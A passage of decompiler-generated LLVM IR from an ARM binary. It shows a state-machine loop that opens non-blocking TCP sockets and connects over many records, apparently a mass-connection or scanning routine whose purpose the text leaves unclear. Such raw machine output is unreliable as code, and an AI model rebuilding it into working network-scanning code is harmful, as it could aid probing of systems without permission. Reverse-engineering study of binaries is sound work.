  %v2_921c = add i32 %v2_8748, -20773
  %v2_88a8 = ptrtoint i32* %stack_var_-44 to i32
  %v2_88b4 = ptrtoint i32* %stack_var_-48 to i32
  %v5_8590 = or i32 %v4_8590, %v3_9eb8
  %v1_8594 = and i32 %v3_9eb8, 128
  %v2_8594 = icmp ne i32 %v1_8594, 0
  %v3_8594248 = udiv i32 %v5_8590, 256
  %v1_859c = add i32 %stack_var_-20872.0.ph, -1464
  %v1_85a4 = add i32 %stack_var_-20872.0.ph, -33
  %sext = mul i32 %v3_8594248, 16777216
  %v4_8710 = sdiv i32 %sext, 16777216
  %sext10 = mul i32 %v3_9eb8, 16777216
  %v4_8718 = sdiv i32 %sext10, 16777216
  %v2_85dc = add i32 %v2_86d0, 112
  br label %dec_label_pc_8528

dec_label_pc_8528:                                ; preds = %dec_label_pc_8794, %dec_label_pc_878c, %dec_label_pc_8574, %dec_label_pc_8838, %dec_label_pc_8528.preheader
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_852c = call i32 @function_1396c(i32* null)
  store i32 %v2_852c, i32* %r0.global-to-local, align 4
  store i32 %v2_852c, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 20684, i32* %ip.global-to-local, align 4
  %v2_854c256 = load i32, i32* @sp, align 4
  %v3_854c257 = add i32 %v2_854c256, 20684
  %v4_854c258 = inttoptr i32 %v3_854c257 to i32*
  store i32 0, i32* %v4_854c258, align 4
  br label %dec_label_pc_853c.dec_label_pc_853c_crit_edge

dec_label_pc_853c.dec_label_pc_853c_crit_edge:    ; preds = %dec_label_pc_8528, %dec_label_pc_853c.dec_label_pc_853c_crit_edge
  %v0_853c.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_854c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_8540 = add i32 %v0_853c.pre, 4
  store i32 %v1_8540, i32* %r3.global-to-local, align 4
  %v1_8544 = add i32 %v0_853c.pre, 20684
  store i32 %v1_8544, i32* %ip.global-to-local, align 4
  %v7_8548 = icmp eq i32 %v1_8540, 128
  %v2_854c = load i32, i32* @sp, align 4
  %v3_854c = add i32 %v2_854c, %v1_8544
  %v4_854c = inttoptr i32 %v3_854c to i32*
  store i32 %v0_854c.pre, i32* %v4_854c, align 4
  br i1 %v7_8548, label %dec_label_pc_8554, label %dec_label_pc_853c.dec_label_pc_853c_crit_edge

dec_label_pc_8554:                                ; preds = %dec_label_pc_853c.dec_label_pc_853c_crit_edge
  %v1_8548 = add i32 %v0_853c.pre, -124
  %v6_8548 = icmp slt i32 %v1_8548, 0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_8548, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_8554 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_8554, i32* %r0.global-to-local, align 4
  %v1_8560259 = add i32 %v0_8554, 4
  store i32 %v1_8560259, i32* %r3.global-to-local, align 4
  %v1_8564260 = add i32 %v0_8554, 20556
  store i32 %v1_8564260, i32* %lr.global-to-local, align 4
  %v7_8568261 = icmp eq i32 %v1_8560259, 128
  %v2_856c262 = load i32, i32* @sp, align 4
  %v3_856c263 = add i32 %v2_856c262, %v1_8564260
  %v4_856c264 = inttoptr i32 %v3_856c263 to i32*
  store i32 %v0_8554, i32* %v4_856c264, align 4
  br i1 %v7_8568261, label %dec_label_pc_8574, label %dec_label_pc_855c.dec_label_pc_855c_crit_edge

dec_label_pc_855c.dec_label_pc_855c_crit_edge:    ; preds = %dec_label_pc_8554, %dec_label_pc_855c.dec_label_pc_855c_crit_edge
  %v0_855c.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_856c.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_8560 = add i32 %v0_855c.pre, 4
  store i32 %v1_8560, i32* %r3.global-to-local, align 4
  %v1_8564 = add i32 %v0_855c.pre, 20556
  store i32 %v1_8564, i32* %lr.global-to-local, align 4
  %v7_8568 = icmp eq i32 %v1_8560, 128
  %v2_856c = load i32, i32* @sp, align 4
  %v3_856c = add i32 %v2_856c, %v1_8564
  %v4_856c = inttoptr i32 %v3_856c to i32*
  store i32 %v0_856c.pre, i32* %v4_856c, align 4
  br i1 %v7_8568, label %dec_label_pc_8574, label %dec_label_pc_855c.dec_label_pc_855c_crit_edge

dec_label_pc_8574:                                ; preds = %dec_label_pc_855c.dec_label_pc_855c_crit_edge, %dec_label_pc_8554
  store i32 %v0_839c, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v1_83b8, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_83b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %tmp207, label %dec_label_pc_8528, label %dec_label_pc_8580

dec_label_pc_8580:                                ; preds = %dec_label_pc_8574
  store i32 %stack_var_-20872.0.ph, i32* %ip.global-to-local, align 4
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 %v5_8590, i32* %r2.global-to-local, align 4
  store i1 %v2_8594, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_8594248, i32* %lr.global-to-local, align 4
  %v0_8598 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_8598, i32* @sl, align 4
  store i32 %v1_859c, i32* @r7, align 4
  store i32 %v0_8598, i32* @r8, align 4
  store i32 %v1_85a4, i32* @r6, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_8650

dec_label_pc_85b8:                                ; preds = %dec_label_pc_865c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v7_85b8 = icmp eq i8 %v3_8650, 2
  store i1 %v7_85b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85b8, label %dec_label_pc_8d68, label %dec_label_pc_85c0

dec_label_pc_85c0:                                ; preds = %dec_label_pc_85b8
  %v2_85c0 = icmp ugt i8 %v3_8650, 3
  store i1 %v2_85c0, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_85c0 = icmp ult i8 %v3_8650, 4
  store i1 %v6_85c0, i1* %cpsr_n.global-to-local, align 1
  %v7_85c0 = icmp eq i8 %v3_8650, 4
  store i1 %v7_85c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85c0, label %dec_label_pc_890c, label %dec_label_pc_85c8

dec_label_pc_85c8:                                ; preds = %dec_label_pc_85c0
  %v2_85c8 = icmp ugt i8 %v3_8650, 5
  store i1 %v2_85c8, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_85c8 = icmp ult i8 %v3_8650, 6
  store i1 %v6_85c8, i1* %cpsr_n.global-to-local, align 1
  %v7_85c8 = icmp eq i8 %v3_8650, 6
  store i1 %v7_85c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85c8, label %.thread24, label %dec_label_pc_85e8

.thread24:                                        ; preds = %dec_label_pc_85c8
  %v2_85cc = add i32 %v3_8900, -1431
  %v3_85cc = inttoptr i32 %v2_85cc to i32*
  %v4_85cc = load i32, i32* %v3_85cc, align 4
  store i32 %v4_85cc, i32* %r0.global-to-local, align 4
  %v4_85d4 = udiv i32 %v4_85cc, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_85d8 = mul nuw nsw i32 %v4_85d4, 4
  store i32 %v2_85dc, i32* %r1.global-to-local, align 4
  %v3_85e0 = add i32 %v4_85d8, %v2_85dc
  store i32 %v3_85e0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_8d48

dec_label_pc_85e8:                                ; preds = %dec_label_pc_85c8
  %v2_85e8 = icmp ugt i8 %v3_8650, 6
  store i1 %v2_85e8, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_85e8 = icmp ult i8 %v3_8650, 7
  store i1 %v6_85e8, i1* %cpsr_n.global-to-local, align 1
  %v7_85e8 = icmp eq i8 %v3_8650, 7
  store i1 %v7_85e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85e8, label %.thread35, label %dec_label_pc_8608

.thread35:                                        ; preds = %dec_label_pc_85e8
  %v2_85ec = add i32 %v3_8900, -1431
  %v3_85ec = inttoptr i32 %v2_85ec to i32*
  %v4_85ec = load i32, i32* %v3_85ec, align 4
  store i32 %v4_85ec, i32* %r0.global-to-local, align 4
  %v4_85f4 = udiv i32 %v4_85ec, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_85f8 = mul nuw nsw i32 %v4_85f4, 4
  store i32 %v2_85dc, i32* %r2.global-to-local, align 4
  %v3_8600 = add i32 %v4_85f8, %v2_85dc
  store i32 %v3_8600, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_8d48

dec_label_pc_8608:                                ; preds = %dec_label_pc_85e8
  %v2_8608 = icmp ugt i8 %v3_8650, 9
  store i1 %v2_8608, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_8608 = icmp ult i8 %v3_8650, 10
  store i1 %v6_8608, i1* %cpsr_n.global-to-local, align 1
  %v7_8608 = icmp eq i8 %v3_8650, 10
  store i1 %v7_8608, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8608, label %dec_label_pc_8d30, label %dec_label_pc_8610

dec_label_pc_8610:                                ; preds = %dec_label_pc_8608
  %v1_8610 = add nsw i32 %v4_8650, -11
  %v2_8610 = icmp ugt i8 %v3_8650, 10
  store i1 %v2_8610, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_8610 = icmp ult i8 %v3_8650, 11
  store i1 %v6_8610, i1* %cpsr_n.global-to-local, align 1
  %v7_8610 = icmp eq i8 %v3_8650, 11
  store i1 %v7_8610, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8610, label %dec_label_pc_98a4, label %dec_label_pc_8618

dec_label_pc_8618:                                ; preds = %dec_label_pc_8d68, %dec_label_pc_8610
  store i32 0, i32* %r3.global-to-local, align 4
  store i8 0, i8* %v2_8650, align 1
  %v0_8620 = load i32, i32* @r6, align 4
  %v1_8620 = add i32 %v0_8620, -1431
  %v2_8620 = inttoptr i32 %v1_8620 to i32*
  %v3_8620 = load i32, i32* %v2_8620, align 4
  store i32 %v3_8620, i32* %r0.global-to-local, align 4
  %v1_8624 = call i32 @function_1369c(i32 %v3_8620)
  store i32 %v1_8624, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_862c = load i32, i32* @r6, align 4
  %v2_862c = add i32 %v1_862c, -1431
  %v3_862c = inttoptr i32 %v2_862c to i32*
  store i32 -1, i32* %v3_862c, align 4
  br label %dec_label_pc_8630

dec_label_pc_8630:                                ; preds = %dec_label_pc_8ccc, %dec_label_pc_8d48, %dec_label_pc_8750, %dec_label_pc_8664, %dec_label_pc_98a4, %dec_label_pc_8618
  store i32 %v0_839c, i32* %lr.global-to-local, align 4
  %v0_8634 = load i32, i32* @r8, align 4
  %v1_8634 = add i32 %v0_8634, 1
  store i32 %v1_8634, i32* @r8, align 4
  %v0_8638 = load i32, i32* @r7, align 4
  %v0_863c = load i32, i32* @r6, align 4
  %v2_8640 = sub i32 %v0_839c, %v1_8634
  %v3_8640 = icmp uge i32 %v0_839c, %v1_8634
  store i1 %v3_8640, i1* %cpsr_c.global-to-local, align 1
  %v4_8640 = xor i32 %v1_8634, %v0_839c
  %v5_8640 = xor i32 %v2_8640, %v0_839c
  %v6_8640 = and i32 %v5_8640, %v4_8640
  %v7_8640 = icmp slt i32 %v6_8640, 0
  store i1 %v7_8640, i1* %cpsr_v.global-to-local, align 1
  %v8_8640 = icmp slt i32 %v2_8640, 0
  store i1 %v8_8640, i1* %cpsr_n.global-to-local, align 1
  %v9_8640 = icmp eq i32 %v0_839c, %v1_8634
  store i1 %v9_8640, i1* %cpsr_z.global-to-local, align 1
  %v1_8644 = add i32 %v0_8638, 3140
  store i32 %v1_8644, i32* @r7, align 4
  %v1_8648 = add i32 %v0_863c, 3140
  store i32 %v1_8648, i32* @r6, align 4
  br i1 %v9_8640, label %dec_label_pc_8630.dec_label_pc_878c_crit_edge, label %dec_label_pc_8650

dec_label_pc_8630.dec_label_pc_878c_crit_edge:    ; preds = %dec_label_pc_8630
  %v0_878c.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_878c

dec_label_pc_8650:                                ; preds = %dec_label_pc_876c, %dec_label_pc_8630, %dec_label_pc_8580
  %v3_8900 = phi i32 [ %v1_85a4, %dec_label_pc_8580 ], [ %v1_8648, %dec_label_pc_8630 ], [ %v1_8784, %dec_label_pc_876c ]
  %v1_8650 = add i32 %v3_8900, -1427
  %v2_8650 = inttoptr i32 %v1_8650 to i8*
  %v3_8650 = load i8, i8* %v2_8650, align 1
  %v4_8650 = zext i8 %v3_8650 to i32
  store i32 %v4_8650, i32* %r3.global-to-local, align 4
  %v2_8654 = icmp ne i8 %v3_8650, 0
  store i1 %v2_8654, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_8654 = icmp eq i8 %v3_8650, 0
  store i1 %v6_8654, i1* %cpsr_n.global-to-local, align 1
  %v7_8654 = icmp eq i8 %v3_8650, 1
  store i1 %v7_8654, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8654, label %dec_label_pc_88f4, label %dec_label_pc_865c

dec_label_pc_865c:                                ; preds = %dec_label_pc_8650
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 %v6_8654, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_8654, label %dec_label_pc_8664, label %dec_label_pc_85b8

dec_label_pc_8664:                                ; preds = %.thread43.dec_label_pc_8664_crit_edge, %dec_label_pc_865c
  %v0_8664 = phi i32 [ %v0_8664.pre, %.thread43.dec_label_pc_8664_crit_edge ], [ %v3_8900, %dec_label_pc_865c ]
  %v1_8664 = add i32 %v0_8664, -1431
  %v2_8664 = inttoptr i32 %v1_8664 to i32*
  %v3_8664 = load i32, i32* %v2_8664, align 4
  store i32 %v3_8664, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v1_8670 = add i32 %v3_8664, 1
  %v2_8670 = icmp eq i32 %v3_8664, -1
  store i1 %v2_8670, i1* %cpsr_c.global-to-local, align 1
  %v3_8670 = sub i32 0, %v3_8664
  %v4_8670 = and i32 %v1_8670, %v3_8670
  %v5_8670 = icmp slt i32 %v4_8670, 0
  store i1 %v5_8670, i1* %cpsr_v.global-to-local, align 1
  %v6_8670 = icmp slt i32 %v1_8670, 0
  store i1 %v6_8670, i1* %cpsr_n.global-to-local, align 1
  %v7_8670 = icmp eq i32 %v1_8670, 0
  store i1 %v7_8670, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-72, align 4
  %v1_8684 = xor i1 %v7_8670, true
  call void @__pseudo_cond_branch(i1 %v1_8684, i32 ptrtoint (i32* @global_var_1369c.26 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_8690 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_8690, i32* %r2.global-to-local, align 4
  %v3_8694 = call i32 @function_13f90(i32 2, i32 1, i32 %v0_8690)
  store i32 %v3_8694, i32* %r0.global-to-local, align 4
  %v1_8698 = add i32 %v3_8694, 1
  %v2_8698 = icmp eq i32 %v3_8694, -1
  store i1 %v2_8698, i1* %cpsr_c.global-to-local, align 1
  %v3_8698 = sub i32 0, %v3_8694
  %v4_8698 = and i32 %v1_8698, %v3_8698
  %v5_8698 = icmp slt i32 %v4_8698, 0
  store i1 %v5_8698, i1* %cpsr_v.global-to-local, align 1
  %v6_8698 = icmp slt i32 %v1_8698, 0
  store i1 %v6_8698, i1* %cpsr_n.global-to-local, align 1
  %v7_8698 = icmp eq i32 %v1_8698, 0
  store i1 %v7_8698, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_8694, i32* @r4, align 4
  %v1_86a0 = load i32, i32* @r6, align 4
  %v2_86a0 = add i32 %v1_86a0, -1431
  %v3_86a0 = inttoptr i32 %v2_86a0 to i32*
  store i32 %v3_8694, i32* %v3_86a0, align 4
  br i1 %v7_8698, label %dec_label_pc_8630, label %dec_label_pc_86a8

dec_label_pc_86a8:                                ; preds = %dec_label_pc_8664
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_86ac = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_86ac, i32* @r2, align 4
  %v0_86b0 = load i32, i32* %r0.global-to-local, align 4
  %v2_86b0 = call i32 @function_135ac(i32 %v0_86b0, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_86b8 = or i32 %v2_86b0, 2048
  store i32 %v1_86b8, i32* @r2, align 4
  %v0_86bc = load i32, i32* @r4, align 4
  store i32 %v0_86bc, i32* %r0.global-to-local, align 4
  %v2_86c0 = call i32 @function_135ac(i32 %v0_86bc, i32 4)
  store i32 %v2_86c0, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %lr.global-to-local, align 4
  store i32 65535, i32* %ip.global-to-local, align 4
  store i32 %v2_86d0, i32* %r3.global-to-local, align 4
  %v0_86d4 = load i32, i32* @r6, align 4
  %v1_86d4 = add i32 %v0_86d4, -1431
  %v2_86d4 = inttoptr i32 %v1_86d4 to i32*
  %v3_86d4 = load i32, i32* %v2_86d4, align 4
  store i32 %v3_86d4, i32* %r0.global-to-local, align 4
  %v0_86d8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_86d8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %stack_var_-40, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 %v2_86e8, i32* %r3.global-to-local, align 4
  %v6_86f0 = call i32 @function_13f60(i32 %v3_86d4, i32 %v0_86d8, i32 8, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v6_86f0, i32* %r0.global-to-local, align 4
  %v0_86f4 = load i32, i32* @r6, align 4
  %v1_86f4 = add i32 %v0_86f4, -1415
  %v2_86f4 = inttoptr i32 %v1_86f4 to i32*
  %v3_86f4 = load i32, i32* %v2_86f4, align 4
  store i32 %v3_86f4, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* %lr.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_8704 = add i32 %v0_86f4, -1431
  %v2_8704 = inttoptr i32 %v1_8704 to i32*
  %v3_8704 = load i32, i32* %v2_8704, align 4
  store i32 %v3_8704, i32* %r0.global-to-local, align 4
  %v3_870c = add i32 %v0_86f4, -1427
  %v4_870c = inttoptr i32 %v3_870c to i8*
  store i8 2, i8* %v4_870c, align 1
  store i32 %v4_8710, i32* %ip.global-to-local, align 4
  %v0_8714 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_8714, i32* %stack_var_-72, align 4
  store i32 %v4_8718, i32* %r3.global-to-local, align 4
  store i32 %v2_8728, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_8730 = load i32, i32* %sb.global-to-local, align 4
  %v1_8730 = load i32, i32* @r6, align 4
  %v2_8730 = add i32 %v1_8730, -1423
  %v3_8730 = inttoptr i32 %v2_8730 to i32*
  store i32 %v0_8730, i32* %v3_8730, align 4
  %v4_8734 = call i32 @function_13dec(i32 %v3_8704, %sockaddr* nonnull %v3_8734, i32 16)
  store i32 %v4_8734, i32* %r0.global-to-local, align 4
  %v0_8738 = load i32, i32* @r6, align 4
  %v1_8738 = add i32 %v0_8738, -1431
  %v2_8738 = inttoptr i32 %v1_8738 to i32*
  %v3_8738 = load i32, i32* %v2_8738, align 4
  store i32 %v3_8738, i32* %r0.global-to-local, align 4
  %v3_8740 = udiv i32 %v3_8738, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8744 = mul nuw nsw i32 %v3_8740, 4
  store i32 %v3_8744, i32* %r3.global-to-local, align 4
  store i32 %v2_8748, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_8750

dec_label_pc_8750:                                ; preds = %dec_label_pc_8d78, %dec_label_pc_86a8
  %v1_875c = phi i32 [ %v3_8738, %dec_label_pc_86a8 ], [ %v3_8d78, %dec_label_pc_8d78 ]
  %v3_8744.pn = phi i32 [ %v3_8744, %dec_label_pc_86a8 ], [ %v3_8d84, %dec_label_pc_8d78 ]
  %storemerge = add i32 %v3_8744.pn, %v2_8748
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v1_8750 = add i32 %storemerge, -292
  %v2_8750 = inttoptr i32 %v1_8750 to i32*
  %v3_8750 = load i32, i32* %v2_8750, align 4
  %v1_8754 = urem i32 %v1_875c, 32
  store i32 %v1_8754, i32* %r1.global-to-local, align 4
  %v1_8758 = load i32, i32* %fp.global-to-local, align 4
  %v7_8758 = shl i32 %v1_8758, %v1_8754
  %v8_8758 = or i32 %v7_8758, %v3_8750
  store i32 %v8_8758, i32* %r2.global-to-local, align 4
  %v0_875c = load i32, i32* @sl, align 4
  %v2_875c = sub i32 %v0_875c, %v1_875c
  %v3_875c = icmp uge i32 %v0_875c, %v1_875c
  store i1 %v3_875c, i1* %cpsr_c.global-to-local, align 1
  %v4_875c = xor i32 %v0_875c, %v1_875c
  %v5_875c = xor i32 %v2_875c, %v0_875c
  %v6_875c = and i32 %v5_875c, %v4_875c
  %v7_875c = icmp slt i32 %v6_875c, 0
  store i1 %v7_875c, i1* %cpsr_v.global-to-local, align 1
  %v8_875c = icmp slt i32 %v2_875c, 0
  store i1 %v8_875c, i1* %cpsr_n.global-to-local, align 1
  %v9_875c = icmp eq i32 %v0_875c, %v1_875c
  store i1 %v9_875c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8758, i32* %v2_8750, align 4
  %v2_8764 = xor i1 %v8_875c, %v7_875c
  br i1 %v2_8764, label %dec_label_pc_8768, label %dec_label_pc_8630

dec_label_pc_8768:                                ; preds = %dec_label_pc_8750
  %v0_8768 = load i32, i32* %r0.global-to-local, align 4
  %v1_8768 = add i32 %v0_8768, 1
  store i32 %v1_8768, i32* @sl, align 4
  br label %dec_label_pc_876c

dec_label_pc_876c:                                ; preds = %dec_label_pc_8d60, %dec_label_pc_8d28, %dec_label_pc_8768
  %v0_878c98 = phi i32 [ %v1_8d60, %dec_label_pc_8d60 ], [ %v1_8d28, %dec_label_pc_8d28 ], [ %v1_8768, %dec_label_pc_8768 ]
  store i32 %v0_839c, i32* %lr.global-to-local, align 4
  %v0_8770 = load i32, i32* @r8, align 4
  %v1_8770 = add i32 %v0_8770, 1
  store i32 %v1_8770, i32* @r8, align 4
  %v0_8774 = load i32, i32* @r7, align 4
  %v0_8778 = load i32, i32* @r6, align 4
  %v2_877c = sub i32 %v0_839c, %v1_8770
  %v3_877c = icmp uge i32 %v0_839c, %v1_8770
  store i1 %v3_877c, i1* %cpsr_c.global-to-local, align 1
  %v4_877c = xor i32 %v1_8770, %v0_839c
  %v5_877c = xor i32 %v2_877c, %v0_839c
  %v6_877c = and i32 %v5_877c, %v4_877c
  %v7_877c = icmp slt i32 %v6_877c, 0
  store i1 %v7_877c, i1* %cpsr_v.global-to-local, align 1
  %v8_877c = icmp slt i32 %v2_877c, 0
  store i1 %v8_877c, i1* %cpsr_n.global-to-local, align 1
  %v9_877c = icmp eq i32 %v0_839c, %v1_8770
  store i1 %v9_877c, i1* %cpsr_z.global-to-local, align 1
  %v1_8780 = add i32 %v0_8774, 3140
  store i32 %v1_8780, i32* @r7, align 4
  %v1_8784 = add i32 %v0_8778, 3140
  store i32 %v1_8784, i32* @r6, align 4
  br i1 %v9_877c, label %dec_label_pc_878c, label %dec_label_pc_8650

dec_label_pc_878c:                                ; preds = %dec_label_pc_876c, %dec_label_pc_8630.dec_label_pc_878c_crit_edge
  %v0_87c4 = phi i32 [ %v0_878c.pre, %dec_label_pc_8630.dec_label_pc_878c_crit_edge ], [ %v0_878c98, %dec_label_pc_876c ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_878c = icmp slt i32 %v0_87c4, 0
  store i1 %v1_878c, i1* %cpsr_n.global-to-local, align 1
  %v2_878c = icmp eq i32 %v0_87c4, 0
  store i1 %v2_878c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_878c, label %dec_label_pc_8528, label %dec_label_pc_8794

dec_label_pc_8794:                                ; preds = %dec_label_pc_878c
  store i32 %v10_82f0, i32* %lr.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %stack_var_-56, align 4
  store i32 %v2_87b4, i32* %ip.global-to-local, align 4
  store i32 %v2_87b8, i32* %r1.global-to-local, align 4
  store i32 %v2_87bc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v0_87c4, i32* %r0.global-to-local, align 4
  %v5_87cc = call i32 @function_138bc(i32 %v0_87c4, i32 %v2_87b8, i32 %v2_87bc, i32 0, i32 %v2_87b4)
  store i32 %v5_87cc, i32* @r4, align 4
  %v0_87d4 = load i32, i32* @r5, align 4
  store i32 %v0_87d4, i32* %r0.global-to-local, align 4
  %v1_87d8 = inttoptr i32 %v0_87d4 to i32*
  %v2_87d8 = call i32 @function_1396c(i32* %v1_87d8)
  store i32 %v2_87d8, i32* %r0.global-to-local, align 4
  %v0_87dc = load i32, i32* @r4, align 4
  %v1_87dc = load i32, i32* @r5, align 4
  %v2_87dc = sub i32 %v0_87dc, %v1_87dc
  %v3_87dc = icmp uge i32 %v0_87dc, %v1_87dc
  store i1 %v3_87dc, i1* %cpsr_c.global-to-local, align 1
  %v4_87dc = xor i32 %v1_87dc, %v0_87dc
  %v5_87dc = xor i32 %v2_87dc, %v0_87dc
  %v6_87dc = and i32 %v5_87dc, %v4_87dc
  %v7_87dc = icmp slt i32 %v6_87dc, 0
  store i1 %v7_87dc, i1* %cpsr_v.global-to-local, align 1
  %v8_87dc = icmp slt i32 %v2_87dc, 0
  store i1 %v8_87dc, i1* %cpsr_n.global-to-local, align 1
  %v9_87dc = icmp eq i32 %v0_87dc, %v1_87dc
  store i1 %v9_87dc, i1* %cpsr_z.global-to-local, align 1
  %v7_87e4 = icmp sgt i32 %v0_87dc, %v1_87dc
  br i1 %v7_87e4, label %dec_label_pc_87e8, label %dec_label_pc_8528

dec_label_pc_87e8:                                ; preds = %dec_label_pc_8794
  store i32 %stack_var_-20868.0.ph, i32* @r8, align 4
  br label %dec_label_pc_8858

dec_label_pc_87f4:                                ; preds = %.thread38.dec_label_pc_87f4_crit_edge, %dec_label_pc_8868
  %v0_880c = phi i32 [ %v0_87f4.pre, %.thread38.dec_label_pc_87f4_crit_edge ], [ %v3_8858, %dec_label_pc_8868 ]
  %v3_87f4 = udiv i32 %v0_880c, 32
  store i32 %v2_8748, i32* %r2.global-to-local, align 4
  %v3_8800 = mul nuw nsw i32 %v3_87f4, 4
  %v2_8804 = add i32 %v3_8800, %v2_8748
  store i32 %v2_8804, i32* %r3.global-to-local, align 4
  %v1_8808 = add i32 %v2_8804, -164
  %v2_8808 = inttoptr i32 %v1_8808 to i32*
  %v3_8808 = load i32, i32* %v2_8808, align 4
  %v1_880c = urem i32 %v0_880c, 32
  store i32 %v1_880c, i32* %r1.global-to-local, align 4
  %v2_8810 = add nsw i32 %v1_880c, -1
  %v3_8810 = shl i32 1, %v2_8810
  %v4_8810 = and i32 %v3_8810, %v3_8808
  %v5_8810 = icmp ne i32 %v4_8810, 0
  store i1 %v5_8810, i1* %cpsr_c.global-to-local, align 1
  %v6_8810 = lshr i32 %v3_8808, %v1_880c
  store i32 %v6_8810, i32* %r2.global-to-local, align 4
  %v1_8814 = urem i32 %v6_8810, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_8814 = icmp eq i32 %v1_8814, 0
  store i1 %v2_8814, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8814, label %dec_label_pc_8838, label %dec_label_pc_881c

dec_label_pc_881c:                                ; preds = %dec_label_pc_87f4
  %v0_881c = load i32, i32* @r8, align 4
  %v1_881c = add i32 %v0_881c, -1452
  %v2_881c = inttoptr i32 %v1_881c to i8*
  %v3_881c = load i8, i8* %v2_881c, align 1
  %v4_881c = zext i8 %v3_881c to i32
  store i32 %v4_881c, i32* %r3.global-to-local, align 4
  %v2_8820 = icmp ugt i8 %v3_881c, 5
  store i1 %v2_8820, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_8820 = icmp ult i8 %v3_881c, 6
  store i1 %v6_8820, i1* %cpsr_n.global-to-local, align 1
  %v7_8820 = icmp eq i8 %v3_881c, 6
  store i1 %v7_8820, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8820, label %dec_label_pc_8dd0, label %dec_label_pc_8828

dec_label_pc_8828:                                ; preds = %dec_label_pc_881c
  %v2_8828 = icmp ugt i8 %v3_881c, 6
  store i1 %v2_8828, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_8828 = icmp ult i8 %v3_881c, 7
